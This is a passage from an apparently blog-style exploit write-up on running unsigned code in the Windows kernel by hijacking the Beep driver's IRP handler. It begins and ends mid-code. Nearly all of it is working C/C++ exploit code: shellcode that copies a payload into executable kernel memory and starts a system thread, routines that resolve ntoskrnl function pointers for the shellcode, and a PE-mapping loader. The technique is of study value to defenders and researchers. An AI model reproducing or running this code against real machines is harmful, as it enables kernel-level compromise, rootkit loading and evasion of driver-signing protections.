</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>pBeepStructData</span><span class=o>-&gt;</span><span class=n>nt_memcpy</span><span class=p>(</span><span class=n>pRwxData</span><span class=p>,</span> <span class=n>pBeepStructData</span><span class=o>-&gt;</span><span class=n>bPayload</span><span class=p>,</span> <span class=n>pBeepStructData</span><span class=o>-&gt;</span><span class=n>szPayloadSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// start thread
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>HANDLE</span> <span class=n>hThread</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>PVOID</span> <span class=n>pStartAddr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)((</span><span class=n>uintptr_t</span><span class=p>)</span><span class=n>pRwxData</span> <span class=o>+</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>pBeepStructData</span><span class=o>-&gt;</span><span class=n>nt_PsCreateSystemThread</span><span class=p>(</span><span class=o>&amp;</span><span class=n>hThread</span><span class=p>,</span> <span class=n>THREAD_ALL_ACCESS</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=p>(</span><span class=n>PKSTART_ROUTINE</span><span class=p>)</span><span class=n>pStartAddr</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=p>)(</span><span class=n>PIRP</span><span class=p>,</span> <span class=n>CCHAR</span><span class=p>))</span><span class=n>pBeepStructData</span><span class=o>-&gt;</span><span class=n>nt_IofCompleteRequest</span><span class=p>)(</span><span class=n>irp</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>__int64</span> <span class=nf>__declspec</span><span class=p>(</span><span class=n>dllexport</span><span class=p>)</span> <span class=n>ShellCodeIrpHandler_end</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// ----------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1>// run some attack
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>BOOL</span> <span class=nf>runTestPayload</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>DBG_LOG</span><span class=p>(</span><span class=s>&#34;[+] Greetings From Kernel Land! </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// ----------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>DRIVER_INITIALIZE</span> <span class=n>DriverEntry</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>_Use_decl_annotations_</span>
</span></span><span class=line><span class=cl>	<span class=n>NTSTATUS</span>
</span></span><span class=line><span class=cl>	<span class=nf>DriverEntry</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=k>struct</span> <span class=nc>_DRIVER_OBJECT</span><span class=o>*</span> <span class=n>DriverObject</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=n>PUNICODE_STRING</span>  <span class=n>RegistryPath</span>
</span></span><span class=line><span class=cl>	<span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>DBG_LOG</span><span class=p>(</span><span class=s>&#34;[+] Driver Loaded Successfully </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>runTestPayload</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>DBG_LOG</span><span class=p>(</span><span class=s>&#34;Executing Attack Payload Failed </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>DbgPrint</span><span class=p>(</span><span class=s>&#34;[*] DONE!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>STATUS_SUCCESS</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>What is left to do in our exploit is to resolve some function pointers. Although Stong’s code also includes handling for relocations, this part was not required for my specific scenario. The reason for this is that all the code we need is contained within the <code>.text</code> section, meaning that there are no global variables or other external references that would necessitate handling relocations. This greatly simplifies the process, as it avoids the need for additional complexity related mind boggling relocations. Instead, we resolve the function pointers to ensure the correct execution flow and copy all the necessary addresses and the payload (i.e. the actual driver PE file&rsquo;s .text section) to a struct which we will finally pass to the beep IRP handler.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=c1>// DriverIRP.h
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>typedef</span> <span class=k>struct</span> <span class=nc>BeepIRPStruct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span><span class=o>*</span> <span class=n>g_NtosKrnl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>nt_memcpy</span><span class=p>)(</span><span class=n>PVOID</span> <span class=n>dst</span><span class=p>,</span> <span class=n>PVOID</span> <span class=n>src</span><span class=p>,</span> <span class=n>SIZE_T</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span><span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=n>nt_ExAllocatePoolWithTag</span><span class=p>)(</span><span class=n>ULONG</span> <span class=n>PoolType</span><span class=p>,</span> <span class=n>SIZE_T</span> <span class=n>NumberOfBytes</span><span class=p>,</span> <span class=n>ULONG</span> <span class=n>Tag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>NTSTATUS</span><span class=p>(</span><span class=o>*</span><span class=n>nt_PsCreateSystemThread</span><span class=p>)(</span><span class=n>PHANDLE</span> <span class=n>ThreadHandle</span><span class=p>,</span> <span class=n>ULONG</span> <span class=n>DesiredAccess</span><span class=p>,</span> <span class=kt>void</span><span class=o>*</span> <span class=n>ObjectAttributes</span><span class=p>,</span> <span class=n>HANDLE</span> <span class=n>ProcessHandle</span><span class=p>,</span> <span class=kt>void</span><span class=o>*</span> <span class=n>ClientId</span><span class=p>,</span> <span class=kt>void</span><span class=o>*</span> <span class=n>StartRoutine</span><span class=p>,</span> <span class=n>PVOID</span> <span class=n>StartContext</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span><span class=o>*</span> <span class=n>nt_IofCompleteRequest</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>SIZE_T</span> <span class=n>szPayloadSize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>BYTE</span> <span class=n>bPayload</span><span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>BeepIRPStruct</span><span class=p>,</span> <span class=n>pBeepIRPStruct</span><span class=p>;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=n>BOOL</span> <span class=nf>CopyFunctionPointers</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[+] ------------------------------------------------------</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] Calculating and Copying Function Pointers </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>DWORD64</span> <span class=n>dwNtosKrnlBase</span> <span class=o>=</span> <span class=n>g_NtosKrnl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>dwNtosKrnlBase</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;Can&#39;t find address of ntoskrnl.exe</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] Kernel Base located at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>dwNtosKrnlBase</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// load ntoskrnl.exe library to retrieve function pointers for shellcode
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>HMODULE</span> <span class=n>hNtoskrnl</span> <span class=o>=</span> <span class=n>LoadLibraryExA</span><span class=p>(</span><span class=s>&#34;ntoskrnl.exe&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>DONT_RESOLVE_DLL_REFERENCES</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>hNtoskrnl</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[!] Failed to map Ntoskrnl Dll&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] Ntoskrnl.exe Dll located at 0x%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>hNtoskrnl</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>g_BeepIRPShellcodeData</span><span class=o>-&gt;</span><span class=n>g_NtosKrnl</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>dwNtosKrnlBase</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PVOID</span> <span class=n>memcpy</span> <span class=o>=</span> <span class=p>(</span><span class=n>PVOID</span><span class=p>)</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>hNtoskrnl</span><span class=p>,</span> <span class=s>&#34;memcpy&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[V] --&gt; GetProcAddress memcpy at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>memcpy</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>g_BeepIRPShellcodeData</span><span class=o>-&gt;</span><span class=n>nt_memcpy</span> <span class=o>=</span> <span class=p>(</span><span class=n>PVOID</span><span class=p>)(</span><span class=n>dwNtosKrnlBase</span> <span class=o>+</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>memcpy</span> <span class=o>-</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>hNtoskrnl</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[V] --&gt; nt!memcpy at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>g_BeepIRPShellcodeData</span><span class=o>-&gt;</span><span class=n>nt_memcpy</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PVOID</span> <span class=n>ExAllocatePoolWithTag</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>hNtoskrnl</span><span class=p>,</span> <span class=s>&#34;ExAllocatePoolWithTag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[V] --&gt; GetProcAddress ExAllocatePoolWithTag at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ExAllocatePoolWithTag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>g_BeepIRPShellcodeData</span><span class=o>-&gt;</span><span class=n>nt_ExAllocatePoolWithTag</span> <span class=o>=</span> <span class=p>(</span><span class=n>PVOID</span><span class=p>)(</span><span class=n>dwNtosKrnlBase</span> <span class=o>+</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>ExAllocatePoolWithTag</span> <span class=o>-</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>hNtoskrnl</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[V] --&gt; nt!ExAllocatePoolWithTag at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>g_BeepIRPShellcodeData</span><span class=o>-&gt;</span><span class=n>nt_ExAllocatePoolWithTag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PVOID</span> <span class=n>PsCreateSystemThread</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>hNtoskrnl</span><span class=p>,</span> <span class=s>&#34;PsCreateSystemThread&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[V] --&gt; GetProcAddress PsCreateSystemThread at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>PsCreateSystemThread</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>g_BeepIRPShellcodeData</span><span class=o>-&gt;</span><span class=n>nt_PsCreateSystemThread</span> <span class=o>=</span> <span class=p>(</span><span class=n>NTSTATUS</span><span class=p>(</span><span class=o>*</span><span class=p>)(</span><span class=n>PHANDLE</span> <span class=n>ThreadHandle</span><span class=p>,</span> <span class=n>ULONG</span> <span class=n>DesiredAccess</span><span class=p>,</span> <span class=kt>void</span><span class=o>*</span> <span class=n>ObjectAttributes</span><span class=p>,</span> <span class=n>HANDLE</span> <span class=n>ProcessHandle</span><span class=p>,</span> <span class=kt>void</span><span class=o>*</span> <span class=n>ClientId</span><span class=p>,</span> <span class=kt>void</span><span class=o>*</span> <span class=n>StartRoutine</span><span class=p>,</span> <span class=n>PVOID</span> <span class=n>StartContext</span><span class=p>))(</span><span class=n>dwNtosKrnlBase</span> <span class=o>+</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>PsCreateSystemThread</span> <span class=o>-</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>hNtoskrnl</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[V] --&gt; nt!PsCreateSystemThread at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>g_BeepIRPShellcodeData</span><span class=o>-&gt;</span><span class=n>nt_PsCreateSystemThread</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PVOID</span> <span class=n>IofCompleteRequest</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>hNtoskrnl</span><span class=p>,</span> <span class=s>&#34;IofCompleteRequest&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[V] --&gt; GetProcAddress IofCompleteRequest at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>IofCompleteRequest</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>g_BeepIRPShellcodeData</span><span class=o>-&gt;</span><span class=n>nt_IofCompleteRequest</span> <span class=o>=</span> <span class=p>(</span><span class=n>PVOID</span><span class=p>)(</span><span class=n>dwNtosKrnlBase</span> <span class=o>+</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>IofCompleteRequest</span> <span class=o>-</span> <span class=p>(</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>hNtoskrnl</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[V] --&gt; nt!IofCompleteRequest at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>g_BeepIRPShellcodeData</span><span class=o>-&gt;</span><span class=n>nt_IofCompleteRequest</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[+] Processing Function Pointers Success! </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[+] ------------------------------------------------------</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The output of the code is shown below:</p><figure class=center><img loading=lazy src=/images/x508.png></figure><p>We also need to update the IAT of the PE file to execute the position independent code once we call the kernel thread. The following code illustrates how this process is carried out in practice. First we map the custom driver including the IRP handler into memory, resolve all the sections and imports and finally retrieve all the function pointers required for our exploit code.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=c1>// Exploit.c
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>BOOL</span> <span class=n>APIENTRY</span> <span class=nf>ProcessShellcodeData</span><span class=p>(</span><span class=n>LPCSTR</span> <span class=n>szPath</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>NonPagedPoolExecute</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[+] ------------------------------------------------------</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[i] Mapping Driver PE File</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>LPVOID</span> <span class=n>hFile</span> <span class=o>=</span> <span class=n>CreateFileA</span><span class=p>(</span><span class=n>szPath</span><span class=p>,</span> <span class=n>GENERIC_READ</span><span class=p>,</span> <span class=n>FILE_SHARE_READ</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>OPEN_EXISTING</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>hFile</span> <span class=o>==</span> <span class=n>INVALID_HANDLE_VALUE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;Invalid handle when map PE file</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>hMapping</span> <span class=o>=</span> <span class=n>CreateFileMappingA</span><span class=p>(</span><span class=n>hFile</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>PAGE_READONLY</span> <span class=o>|</span> <span class=n>SEC_IMAGE_NO_EXECUTE</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>hMapping</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;Cannot make file mapping</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>LPVOID</span> <span class=n>lpBase</span> <span class=o>=</span> <span class=n>MapViewOfFile</span><span class=p>(</span><span class=n>hMapping</span><span class=p>,</span> <span class=n>FILE_MAP_READ</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>lpBase</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;Cannot make MapViewOfFile</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PIMAGE_DOS_HEADER</span> <span class=n>image</span> <span class=o>=</span> <span class=p>(</span><span class=n>PIMAGE_DOS_HEADER</span><span class=p>)</span><span class=n>lpBase</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>image</span><span class=o>-&gt;</span><span class=n>e_magic</span> <span class=o>!=</span> <span class=n>IMAGE_DOS_SIGNATURE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;IMAGE_DOS_SIGNATURE not matched</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PIMAGE_NT_HEADERS</span> <span class=n>pe</span> <span class=o>=</span> <span class=p>(</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)((</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>lpBase</span> <span class=o>+</span> <span class=n>image</span><span class=o>-&gt;</span><span class=n>e_lfanew</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>pe</span><span class=o>-&gt;</span><span class=n>Signature</span> <span class=o>!=</span> <span class=n>IMAGE_NT_SIGNATURE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;IMAGE_NT_SIGNATURE not matched</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>LPVOID</span> <span class=n>pPeMapping</span> <span class=o>=</span> <span class=n>VirtualAlloc</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=n>pe</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>SizeOfImage</span><span class=p>,</span> <span class=n>MEM_RESERVE</span> <span class=o>|</span> <span class=n>MEM_COMMIT</span><span class=p>,</span> <span class=n>PAGE_EXECUTE_READWRITE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[+] Mapping Success!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>PRINTA</span><span class=p>(</span><span class=s>&#34;[+] ------------------------------------------------------</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>num_sections</span> <span class=o>=</span> <span class=n>pe</span><span class=o>-&gt;</span><span class=n>FileHeader</span><span class=p>.</span><span class=n>NumberOfSections</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>IMAGE_SECTION_HEADER</span><span class=o>*</span> <span class=n>sectionHeader</span> <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_SECTION_HEADER</span><span class=o>*</span><span class=p>)((</span><span class=n>DWORD64</span><span class=p>)</span><span class=o>&amp;</span><span class=n>pe</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span> <span class=o>+</span> <span class=n>pe</span><span class=o>-&gt;</span><span class=n>FileHeader</span><span class=p>.</span><span class=n>SizeOfOptionalHeader</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// map sections
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>memcpy</span><span class=p>(</span><span class=n>pPeMapping</span><span class=p>,</span> <span class=n>image</span><span class=p>,</span> <span class=n>pe</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>SizeOfHeaders</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>num_sections</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>,</span> <span class=n>sectionHeader</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=kt>void</span><span class=o>*</span> <span class=n>src</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)((</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>image</span> <span class=o>+</span> <span class=n>sectionHeader</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=kt>void</span><span class=o>*</span> <span class=n>dst</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)((</span><span class=n>DWORD64</span><span class=p>)</span><span class=n>pPeMapping</span> <span class=o>+</span> <span class=n>sectionHeader</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>SIZE_T</span> <span class=n>size</span> <span class=o>=</span> <span class=n>sectionHeader</span><span class=o>-&gt;</span><span class=n>SizeOfRawData</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>memset</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>memcpy</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>src</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=kt>char</span> <span class=n>name</span><span class=p>[</span><span class=mi>9</span><span class=p>];</span>
